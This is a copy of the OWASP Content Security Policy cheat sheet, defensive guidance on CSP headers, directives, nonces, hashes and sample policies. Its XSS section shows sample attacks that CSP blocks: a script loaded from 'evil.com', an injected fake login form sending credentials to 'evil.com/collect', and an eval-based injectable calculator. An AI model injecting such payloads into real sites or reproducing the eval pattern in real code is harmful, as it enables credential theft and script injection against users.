---
description: >-
  https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
---

# Content Security Policy

## Content Security Policy Cheat Sheet[¶](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#content-security-policy-cheat-sheet) <a href="#content-security-policy-cheat-sheet" id="content-security-policy-cheat-sheet"></a>

### Introduction[¶](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#introduction) <a href="#introduction" id="introduction"></a>

This article brings forth a way to integrate the **defense in depth** concept to the client-side of web applications. By injecting the Content-Security-Policy (CSP) headers from the server, the browser is aware and capable of protecting the user from dynamic calls that will load content into the page currently being visited.

### Context[¶](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#context) <a href="#context" id="context"></a>

The increase in XSS (Cross-Site Scripting), clickjacking, and cross-site leak vulnerabilities demands a more **defense in depth** security approach.

#### Defense against XSS[¶](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#defense-against-xss) <a href="#defense-against-xss" id="defense-against-xss"></a>

CSP defends against XSS attacks in the following ways:

**1. Restricting Inline Scripts**[**¶**](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#1-restricting-inline-scripts)

By preventing the page from executing inline scripts, attacks like injecting

```
<script>document.body.innerHTML='defaced'</script>
```

will not work.

**2. Restricting Remote Scripts**[**¶**](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#2-restricting-remote-scripts)

By preventing the page from loading scripts from arbitrary servers, attacks like injecting

```
<script src="https://evil.com/hacked.js"></script>
```

will not work.

**3. Restricting Unsafe JavaScript**[**¶**](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#3-restricting-unsafe-javascript)

By preventing the page from executing text-to-JavaScript functions like `eval`, the website will be safe from vulnerabilities like the this:

```
// A Simple Calculator
var op1 = getUrlParameter("op1");
var op2 = getUrlParameter("op2");
var sum = eval(`${op1} + ${op2}`);
console.log(`The sum is: ${sum}`);
```

**4. Restricting Form submissions**[**¶**](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#4-restricting-form-submissions)

By restricting where HTML forms on your website can submit their data, injecting phishing forms won't work either.

```
<form method="POST" action="https://evil.com/collect">
<h3>Session expired! Please login again.</h3>
<label>Username</label>
<input type="text" name="username"/>

<label>Password</label>
<input type="password" name="pass"/>

<input type="Submit" value="Login"/>
</form>
```

**5. Restricting Objects**[**¶**](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#5-restricting-objects)

And by restricting the HTML [object](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object) tag, it also won't be possible for an attacker to inject malicious flash/Java/other legacy executables on the page.

#### Defense against framing attacks[¶](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#defense-against-framing-attacks) <a href="#defense-against-framing-attacks" id="defense-against-framing-attacks"></a>

Attacks like clickjacking and some variants of browser side-channel attacks (xs-leaks) require a malicious website to load the target website in a frame.

Historically the `X-Frame-Options` header has been used for this, but it has been obsoleted by the `frame-ancestors` CSP directive.

### Defense in Depth[¶](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#defense-in-depth) <a href="#defense-in-depth" id="defense-in-depth"></a>

A strong CSP provides an effective second layer of protection against various types of vulnerabilities, especially XSS. Although CSP doesn't prevent web applications from _containing_ vulnerabilities, it can make those vulnerabilities significantly more difficult for an attacker to exploit.

Even on a fully static website, which does not accept any user input, a CSP can be used to enforce the use of [Subresource Integrity (SRI)](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource\_Integrity). This can help prevent malicious code from being loaded on the website if one of the third-party sites hosting JavaScript files (such as analytics scripts) is compromised.

### CSP is not a substitute for secure development[¶](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#csp-is-not-a-substitute-for-secure-development) <a href="#csp-is-not-a-substitute-for-secure-development" id="csp-is-not-a-substitute-for-secure-development"></a>

CSP **should not** be relied upon as the only defensive mechanism against XSS. You must still follow good development practices such as the ones described in [Cross-Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross\_Site\_Scripting\_Prevention\_Cheat\_Sheet.html), and then deploy CSP on top of that as a bonus security layer.

### Policy Delivery[¶](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#policy-delivery) <a href="#policy-delivery" id="policy-delivery"></a>

You can deliver a Content Security Policy to your website in three ways.

#### 1. Content-Security-Policy Header[¶](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#1-content-security-policy-header) <a href="#1-content-security-policy-header" id="1-content-security-policy-header"></a>

Send a Content-Security-Policy HTTP response header from your web server.

```
Content-Security-Policy: ...
```

Using a header is the preferred way and supports the full CSP feature set. Send it in all HTTP responses, not just the index page.

#### 2. Content-Security-Policy-Report-Only Header[¶](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#2-content-security-policy-report-only-header) <a href="#2-content-security-policy-report-only-header" id="2-content-security-policy-report-only-header"></a>

Using the `Content-Security-Policy-Report-Only`, you can deliver a CSP that doesn't get enforced.

```
Content-Security-Policy-Report-Only: ...
```

Still, violation reports are printed to the console and delivered to a violation endpoint if the `report-to` and `report-uri` directives are used.

Browsers fully support the ability of a site to use both `Content-Security-Policy` and `Content-Security-Policy-Report-Only` together, without any issues. This pattern can be used for example to run a strict `Report-Only` policy (to get many violation reports), while having a looser enforced policy (to avoid breaking legitimate site functionality).

#### 3. Content-Security-Policy Meta Tag[¶](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#3-content-security-policy-meta-tag) <a href="#3-content-security-policy-meta-tag" id="3-content-security-policy-meta-tag"></a>

Sometimes you cannot use the Content-Security-Policy header if you are, e.g., Deploying your HTML files in a CDN where the headers are out of your control.

In this case, you can still use CSP by specifying a `http-equiv` meta tag in the HTML markup, like so:

```
<meta http-equiv="Content-Security-Policy" content="...">
```

Almost everything is still supported, including full XSS defenses. However, you will not be able to use [framing protections](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors), [sandboxing](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox), or a [CSP violation logging endpoint](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to).

#### HTTP Headers[¶](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#http-headers) <a href="#http-headers" id="http-headers"></a>

The following are headers for CSP.

* `Content-Security-Policy` : W3C Spec standard header. Supported by Firefox 23+, Chrome 25+ and Opera 19+
* `Content-Security-Policy-Report-Only` : W3C Spec standard header. Supported by Firefox 23+, Chrome 25+ and Opera 19+, whereby the policy is non-blocking ("fail open") and a report is sent to the URL designated by the `report-uri` (or newer `report-to`) directive. This is often used as a precursor to utilizing CSP in blocking mode ("fail closed")
* `DO NOT` use X-Content-Security-Policy or X-WebKit-CSP. Their implementations are obsolete (since Firefox 23, Chrome 25), limited, inconsistent, and incredibly buggy.

### CSP Directives[¶](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#csp-directives) <a href="#csp-directives" id="csp-directives"></a>

Multiple types of directives exist that allow the developer to control the flow of the policies granularly.

#### Fetch Directives[¶](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#fetch-directives) <a href="#fetch-directives" id="fetch-directives"></a>

Fetch directives tell the browser the locations to trust and load resources from.

Most fetch directives have a certain [fallback list specified in w3](https://www.w3.org/TR/CSP3/#directive-fallback-list). This list allows for granular control of the source of scripts, images, files, etc.

* `child-src` allows the developer to control nested browsing contexts and worker execution contexts.
* `connect-src` provides control over fetch requests, XHR, eventsource, beacon and websockets connections.
* `font-src` specifies which URLs to load fonts from.
* `img-src` specifies the URLs that images can be loaded from.
* `manifest-src` specifies the URLs that application manifests may be loaded from.
* `media-src` specifies the URLs from which video, audio and text track resources can be loaded from.
* `prefetch-src` specifies the URLs from which resources can be prefetched from.
* `object-src` specifies the URLs from which plugins can be loaded from.
* `script-src` specifies the locations from which a script can be executed from. It is a fallback directive for other script-like directives.
  * `script-src-elem` controls the location from which execution of script requests and blocks can occur.
  * `script-src-attr` controls the execution of event handlers.
* `style-src` controls from where styles get applied to a document. This includes `<link>` elements, `@import` rules, and requests originating from a `Link` HTTP response header field.
  * `style-src-elem` controls styles except for inline attributes.
  * `style-src-attr` controls styles attributes.
* `default-src` is a fallback directive for the other fetch directives. Directives that are specified have no inheritance, yet directives that are not specified will fall back to the value of `default-src`.

#### Document Directives[¶](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#document-directives) <a href="#document-directives" id="document-directives"></a>

Document directives instruct the browser about the properties of the document to which the policies will apply to.

* `base-uri` specifies the possible URLs that the `<base>` element can use.
* `plugin-types` limits the types of resources that can be loaded into the document (_e.g._ application/pdf). 3 rules apply to the affected elements, `<embed>` and `<object>`:
  * The element needs to explicitly declare its type.
  * The element's type needs to match the declared type.
  * The element's resource need to match the declared type.
* `sandbox` restricts a page's actions such as submitting forms.
  * Only applies when used with the request header `Content-Security-Policy`.
  * Not specifying a value for the directive activates all of the sandbox restrictions. `Content-Security-Policy: sandbox;`
  * [Sandbox syntax](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox#Syntax)

#### Navigation Directives[¶](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#navigation-directives) <a href="#navigation-directives" id="navigation-directives"></a>

Navigation directives instruct the browser about the locations that the document can navigate to.

* `navigate-to` restricts the URLs which a document can navigate to by any mean ([not yet supported](https://caniuse.com/?search=navigate-to) by modern browsers in Jan 2021).
* `form-action` restricts the URLs which the forms can submit to.
* `frame-ancestors` restricts the URLs that can embed the requested resource inside of `<frame>`, `<iframe>`, `<object>`, `<embed>`, or `<applet>` elements.
  * If this directive is specified in a `<meta>` tag, the directive is ignored.
  * This directive doesn't fallback to `default-src` directive.
  * `X-Frame-Options` is rendered obsolete by this directive and is ignored by the user agents.

#### Reporting Directives[¶](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#reporting-directives) <a href="#reporting-directives" id="reporting-directives"></a>

Reporting directives deliver violations of prevented behaviors to specified locations. These directives serve no purpose on their own and are dependent on other directives.

* `report-to` which is a groupname defined in the header in a json formatted header value.
  * [MDN report-to documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to)
* `report-uri` directive is deprecated by `report-to`, which is a URI that the reports are sent to.
  * Goes by the format of: `Content-Security-Policy: report-uri https://example.com/csp-reports`

In order to ensure backward compatibility, use the 2 directives in conjunction. Whenever a browser supports `report-to`, it will ignore `report-uri`. Otherwise, `report-uri` will be used.

#### Special Directive Sources[¶](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#special-directive-sources) <a href="#special-directive-sources" id="special-directive-sources"></a>

| Value            | Description                                                                  |
| ---------------- | ---------------------------------------------------------------------------- |
| 'none'           | No URLs match.                                                               |
| 'self'           | Refers to the origin site with the same scheme and port number.              |
| 'unsafe-inline'  | Allows the usage of inline scripts or styles.                                |
| 'unsafe-eval'    | Allows the usage of eval in scripts.                                         |
| 'strict-dynamic' | Informs the browser to trust scripts originating from a root trusted script. |

_Note:_ `strict-dynamic` is not a standalone directive and should be used in combination with other directive values, such as `nonce`, `hashes`, etc.

To better understand how the directive sources work, check out the [source lists from w3c](https://w3c.github.io/webappsec-csp/#framework-directive-source-list).

#### Hashes[¶](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#hashes) <a href="#hashes" id="hashes"></a>

When inline scripts are required, the `script-src 'hash_algo-hash'` is one option for allowing only specific scripts to execute.

```
Content-Security-Policy: script-src 'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='
```

To get the hash, look at Google Chrome developer tools for violations like this:

> ❌ Refused to execute inline script because it violates the following Content Security Policy directive: "..." Either the 'unsafe-inline' keyword, a hash (**'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='**), or a nonce...

You can also use this [hash generator](https://report-uri.com/home/hash). This is a great [example](https://csp.withgoogle.com/docs/faq.html#static-content) of using hashes.

**Note**[**¶**](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#note)

Using hashes is generally not a very good approach. If you change _anything_ inside the script tag (even whitespace) by, e.g., formatting your code, the hash will be different, and the script won't render.

#### Nonces[¶](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#nonces) <a href="#nonces" id="nonces"></a>

Nonces are unique one-time-use random values that you generate for each HTTP response, and add to the Content-Security-Policy header, like so:

```
const nonce = uuid.v4();
scriptSrc += ` 'nonce-${nonce}'`;
```

You would then pass this nonce to your view (using nonces requires a non-static HTML) and render script tags that look something like this:

```
<script nonce="<%= nonce %>">
    ...
</script>
```

**Warning**[**¶**](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#warning)

**Don't** create a middleware that replaces all script tags with "script nonce=..." because attacker-injected scripts will then get the nonces as well. You need an actual HTML templating engine to use nonces.

#### strict-dynamic[¶](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#strict-dynamic) <a href="#strict-dynamic" id="strict-dynamic"></a>

The `strict-dynamic` directive can be used in combination with either, hashes or nonces.

If the script block is creating additional DOM elements and executing JS inside of them, `strict-dynamic` tells the browser to trust those elements.

Note that `strict-dynamic` is a CSP level 3 feature and not very widely supported yet. For more details, check out [strict-dynamic usage](https://w3c.github.io/webappsec-csp/#strict-dynamic-usage).

### CSP Sample Policies[¶](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#csp-sample-policies) <a href="#csp-sample-policies" id="csp-sample-policies"></a>

#### Basic CSP Policy[¶](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#basic-csp-policy) <a href="#basic-csp-policy" id="basic-csp-policy"></a>

This policy prevents cross-site framing and cross-site form-submissions. It will only allow resources from the originating domain for all the default level directives and will not allow inline scripts/styles to execute.

If your application functions with these restrictions, it drastically reduces your attack surface and works with most modern browsers.

The most basic policy assumes:

* All resources are hosted by the same domain of the document.
* There are no inlines or evals for scripts and style resources.
* There is no need for other websites to frame the website.
* There are no form-submissions to external websites.

```
Content-Security-Policy: default-src 'self'; frame-ancestors 'self'; form-action 'self';
```

To tighten further, one can apply the following:

```
Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'self'; form-action 'self';
```

This policy allows images, scripts, AJAX, and CSS from the same origin and does not allow any other resources to load (e.g., object, frame, media, etc.).

#### Upgrading insecure requests[¶](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#upgrading-insecure-requests) <a href="#upgrading-insecure-requests" id="upgrading-insecure-requests"></a>

If the developer is migrating from HTTP to HTTPS, the following directive will ensure that all requests will be sent over HTTPS with no fallback to HTTP:

```
Content-Security-Policy: upgrade-insecure-requests;
```

#### Preventing framing attacks (clickjacking, cross-site leaks)[¶](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#preventing-framing-attacks-clickjacking-cross-site-leaks) <a href="#preventing-framing-attacks-clickjacking-cross-site-leaks" id="preventing-framing-attacks-clickjacking-cross-site-leaks"></a>

* To prevent all framing of your content use:
  * `Content-Security-Policy: frame-ancestors 'none';`
* To allow for the site itself, use:
  * `Content-Security-Policy: frame-ancestors 'self';`
* To allow for trusted domain, do the following:
  * `Content-Security-Policy: frame-ancestors trusted.com;`

#### Strict Policy[¶](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#strict-policy) <a href="#strict-policy" id="strict-policy"></a>

A strict policy's role is to protect against classical stored, reflected, and some of the DOM XSS attacks and should be the optimal goal of any team trying to implement CSP.

Google went ahead and set up a [guide](https://web.dev/strict-csp) to adopt a strict CSP based on nonces.

Based on a [presentation](https://speakerdeck.com/lweichselbaum/csp-a-successful-mess-between-hardening-and-mitigation?slide=55) at LocoMocoSec, the following two policies can be used to apply a strict policy:

* Moderate Strict Policy:

```
script-src 'nonce-r4nd0m' 'strict-dynamic';
object-src 'none'; base-uri 'none';
```

* Locked down Strict Policy:

```
script-src 'nonce-r4nd0m';
object-src 'none'; base-uri 'none';
```

#### Refactoring inline code[¶](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#refactoring-inline-code) <a href="#refactoring-inline-code" id="refactoring-inline-code"></a>

When `default-src` or `script-src*` directives are active, CSP by default disables any JavaScript code placed inline in the HTML source, such as this:

```
<script>
var foo = "314"
<script>
```

The inline code can be moved to a separate JavaScript file and the code in the page becomes:

```
<script src="app.js">
</script>
```

With `app.js` containing the `var foo = "314"` code.

The inline code restriction also applies to `inline event handlers`, so that the following construct will be blocked under CSP:

```
<button id="button1" onclick="doSomething()">
```

This should be replaced by `addEventListener` calls:

```
document.getElementById("button1").addEventListener('click', doSomething);
```

### References[¶](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#references) <a href="#references" id="references"></a>

* [Strict CSP](https://web.dev/strict-csp)
* [CSP Level 3 W3C](https://www.w3.org/TR/CSP3/)
* [Content-Security-Policy](https://content-security-policy.com/)
* [MDN CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)
* [CSP Wikipedia](https://en.wikipedia.org/wiki/Content\_Security\_Policy)
* [CSP CheatSheet by Scott Helme](https://scotthelme.co.uk/csp-cheat-sheet/)
* [Breaking Bad CSP](https://www.slideshare.net/LukasWeichselbaum/breaking-bad-csp)
* [CSP A Successful Mess Between Hardening And Mitigation](https://speakerdeck.com/lweichselbaum/csp-a-successful-mess-between-hardening-and-mitigation)
* [CSP Scanner](https://cspscanner.com/)
* [Content Security Policy Guide on AppSec Monkey](https://www.appsecmonkey.com/blog/content-security-policy-header/)
* CSP Generator: [Chrome](https://chrome.google.com/webstore/detail/content-security-policy-c/ahlnecfloencbkpfnpljbojmjkfgnmdc)/[Firefox](https://addons.mozilla.org/en-US/firefox/addon/csp-generator/)
